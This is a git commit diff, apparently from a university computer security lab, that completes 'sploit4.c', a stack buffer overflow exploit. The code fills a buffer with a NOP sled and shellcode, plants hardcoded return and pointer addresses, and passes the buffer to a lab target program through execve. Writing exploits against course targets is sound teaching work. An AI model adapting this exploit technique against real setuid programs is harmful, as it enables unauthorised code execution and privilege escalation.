5cd6d0072a74b73ed0b6af49570f5c83913f9876
Baiwu  Zhang <zhangba8@p57.ecf.utoronto.ca>
2018-09-28 18:38:20 -0400

    Finished Lab1 Part4.

--- Lab1/sploits/sploit4.c
+++ Lab1/sploits/sploit4.c
@@ -8,14 +8,31 @@
 
 int main(void)
 {
-  char *args[3];
-  char *env[1];
+	char *args[3];
+	char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
-  env[0] = NULL;
+	int BUFSIZE = 189;
+	char attackBuffer[BUFSIZE];
+	int shellcode_length = 45;
+	int i;
+	for (i = 0; i < BUFSIZE; i++){
+		attackBuffer[i] = 0x90;	
+	}
+	for (i = 0; i < 45; i ++){
+		attackBuffer[ i] = shellcode[i];
+	}
+	*(int *) & attackBuffer[184] = 0x3050fdb0;
+	*(int *) & attackBuffer[168] = 0x010101BC;
+	*(int *) & attackBuffer[172] = 0x010101AC;
+	attackBuffer[188] = NULL;
+	
+	args[0] = TARGET;
+	args[1] = attackBuffer;
+	args[2] = NULL;
+	env[0] = NULL;
 
-  if (0 > execve(TARGET, args, env))
-    fprintf(stderr, "execve failed.\n");
+	if (0 > execve(TARGET, args, env))
+		fprintf(stderr, "execve failed.\n");
 
-  return 0;
+	return 0;
 }
